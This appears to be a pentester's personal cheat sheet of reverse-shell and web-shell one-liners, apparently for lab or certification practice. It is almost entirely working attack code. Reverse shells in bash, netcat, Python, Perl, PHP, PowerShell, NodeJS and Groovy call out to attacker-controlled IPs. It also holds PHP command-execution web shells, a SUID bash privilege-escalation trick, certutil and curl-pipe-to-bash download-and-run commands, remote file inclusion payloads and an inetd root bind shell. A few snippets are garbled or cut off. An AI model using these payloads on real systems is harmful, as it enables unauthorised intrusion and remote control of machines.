## RevShells

#### BASH

```bash
bash -i >& /dev/tcp/192.168.45.204/22 0>&1

echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/pwned\nchmod 4777 /tmp/pwned' >> full-checkup.sh
chmod +x full-checkup.sh
/tmp/pwned -p
```

Very fucking reliable.

```bash
busybox nc 192.168.45.204 1234 -e sh
busybox nc 192.168.45.204 80 -e /bin/sh
```

#### PHP

```bash
<?php file_get_contents('/etc/passwd'); ?>
php -r '$sock=fsockopen("192.168.45.204", 60001);exec("/bin/sh -i <&3 >&3 2>&3");'

cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
python3 -m http.server
nc -nlvp 443
<?php system("wget http://192.168.45.204/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>

cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 800
nc -nlvp 443
&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php

 &cmd=whoami or ?cmd=whoami
<?php shell_exec($_GET["cmd"]);?>
<?php system($_GET["cmd"]);?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_POST['id']); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 800
nc -nlvp 443
&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php

echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
shell.php&cmd=
```

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
or

192.168.49.140

#### NetExec (Pwn3d! = Shell)

```bash
netexec smb $ip -u $user -p $pass -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
```

#### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.163",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Netcat

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.163 80 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 80 >/tmp/f

busybox nc $ip 5000 -e /bin/bash

certutil.exe -urlcache -split -f http://192.168.45.195:443/nc.exe C:\Windows\Tasks\nc.exe & C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.195 80
```

#### Perl

```bash
perl -e 'use Socket:$i="192.168.45.163";$0=443;socket(S,PF INET,SOCK STREAM, getprotobyname("tcp")); if(connect (S, sockaddr_in($p,inet_aton ($i)))) {open(STDIN, ">&S") ; open (STDOUT, ">&S") ;open (STDERR, ">&S") ;exec("/bin/sh -i"T;};'
```

#### CMD

```bash
'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.204:8000/rev.ps1") | powershell 
-noprofile'
````

General:

- “Curl ip/reverse.sh | bash” not a bad idea.
- wget'ing to tmp, chmod +x, then bash -c /tmp/pwn.sh

#### PsExec

If you have creds and can't get psexec onto the box, try it locally to get a shell

```bash
proxychains psexec.py USERC:USERCishere@10.11.1.50 cmd.exe
```

#### Bypass Python 2 input()

```bash
__import__('os').system('/bin/bash -p')
```

#### Use ConPty Windows Shell

Make sure to copy raw file whenever copy-pasting from GitHub.

WHENEVER YOU'RE SENDING A POST REQUEST, INCLUDE THE CONTEXT-TYPE HEADER, like 'Content-Type: application/x-www-form-urlencoded'.

```bash
include=echo+WAZZUP%3b
include=/etc/passwd
include=http://10.10.14.8:8000/fake
include=http://10.10.14.8:8000/reverse-shell.php
include=reverse-shell.php
```
When testing for a php reverse shell, you can make a simple php file that says "echo WAZZUP;" and check whether "WAZZUP" is returned in the response.

If that doesn't work, you could have him connect back to us so that we could crack the hash.

```bash
cat conpty.php
stty raw -echo; (stty size; cat) | nc -lvnp 8888
system("powershell IEX(IWR http://10.10.14.11:53/con.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.11 8888");
```

#### Inet Bind Shell ??

```bash
"echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
nc -nv $ip 31337
```

#### Windows nc.exe

This is a reliable reverse shell from Windows computer. If you can upload a file, try msfvenom payload, and if that doesn't work, upload a nc.exe binary and try 

```bash
.\nc.exe -nv 192.168.XX.XX 445 -e cmd.exe
```

#### Windows

One reliable revshell is the powershell encoded one on revshells.

#### Two-Parter via File Upload Vuln

Upload netcat.exe, then php file that will trigger it.

```php
<?php
system('netcat.exe -vv 192.168.4.178 443 -e cmd.exe');
?>
```

#### Javascript ( NodeJS ) SSTI

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(3000, "192.168.45.204", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

#### Groovy-based - Jenkins Console

```bash
# Linux
r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()
# Windows
def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
# Windows
String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);
```